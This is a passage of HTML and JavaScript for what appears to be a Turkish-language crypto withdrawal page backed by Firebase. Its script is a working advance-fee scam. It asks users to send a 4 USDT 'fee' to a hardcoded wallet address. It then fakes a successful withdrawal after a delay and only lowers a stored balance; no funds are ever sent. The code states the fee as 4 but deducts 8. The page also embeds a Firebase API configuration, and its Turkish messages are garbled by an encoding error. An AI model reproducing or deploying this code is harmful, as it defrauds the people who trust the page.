      text-decoration: none;
      transition: background 0.3s;
    }

    }
  </style>
</head>
<body>

  <!-- Firebase ve ƒ∞≈ülem Script -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
    import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
      authDomain: "crypto-eccb4.firebaseapp.com",
      projectId: "crypto-eccb4",
      storageBucket: "crypto-eccb4.appspot.com",
      messagingSenderId: "773649197313",
      appId: "1:773649197313:web:18da6ed3ee63353c4e9300"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const withdrawBtn = document.getElementById("withdrawBtn");
    const withdrawAddress = document.getElementById("withdrawAddress");
    const withdrawAmount = document.getElementById("withdrawAmount");
    const withdrawMessage = document.getElementById("withdrawMessage");
    const balanceSpan = document.getElementById("balance");

    let userId = localStorage.getItem("userId");
    if (!userId) {
      userId = "user_" + Math.random().toString(36).substring(2, 10);
      localStorage.setItem("userId", userId);
    }

    let balance = 0;
    (async () => {
      const ref = doc(db, "balances", userId);
      const snap = await getDoc(ref);
      if (snap.exists()) {
        balance = snap.data().amount;
        updateBalanceDisplay(balance);
      }
    })();

    function updateBalanceDisplay(value) {
      balanceSpan.textContent = value.toFixed(4);
    }

    withdrawBtn.onclick = () => {
      withdrawMessage.style.color = "#ff5555";
      const addr = withdrawAddress.value.trim();
      const amount = parseFloat(withdrawAmount.value);

      if (addr.length < 10) {
        withdrawMessage.textContent = "‚ö†Ô∏è Ge√ßersiz c√ºzdan adresi!";
        return;
      }
      if (isNaN(amount) || amount < 50) {
        withdrawMessage.textContent = "‚ö†Ô∏è Minimum 50 USDT √ßekebilirsiniz.";
        return;
      }
      if (amount + 8 > balance) {
        withdrawMessage.textContent = "‚ùå Yetersiz bakiye.";
        return;
      }

      withdrawMessage.style.color = "#ffaa00";
      withdrawMessage.innerHTML = `L√ºtfen 4 USDT i≈ülem √ºcretini a≈üaƒüƒ±daki adrese g√∂nderin:\n<strong>TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH</strong>`;

      const copyBtn = document.createElement("button");
      copyBtn.textContent = "Adresi Kopyala";
      copyBtn.className = "copy-btn";
      copyBtn.onclick = () => {
        navigator.clipboard.writeText("TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH");
        copyBtn.textContent = "Kopyalandƒ± ‚úÖ";
      };
      withdrawMessage.appendChild(copyBtn);

      setTimeout(() => {
        balance -= (amount + 8);
        updateBalanceDisplay(balance);
        withdrawMessage.style.color = "#55ff55";
        withdrawMessage.innerHTML = `‚úÖ ${amount.toFixed(2)} USDT ba≈üarƒ±yla √ßekildi.\nüí∏ 8 USDT i≈ülem √ºcreti kesildi.`;

        withdrawAmount.value = "";
        withdrawAddress.value = "";

        setDoc(doc(db, "balances", userId), { amount: balance });
      }, 3500);
    };
  </script>
